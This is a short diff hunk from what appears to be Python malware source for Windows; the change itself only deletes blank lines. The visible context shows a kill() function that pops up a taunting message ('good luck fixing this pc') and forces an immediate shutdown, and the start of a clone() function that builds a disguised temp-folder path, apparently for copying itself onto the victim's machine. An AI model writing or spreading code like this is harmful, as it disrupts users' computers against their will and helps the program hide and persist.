@@ -54,9 +54,6 @@ def kill():
     os.system("msg %username% have a nice day and good luck fixing this pc")
     os.system("shutdown -s -t 3")
 
-
-
-
 def clone():
     try:
         path_to_create = r'C:\Users\%s\AppData\Local\Temp\_TMP995858_atmpk' % USER
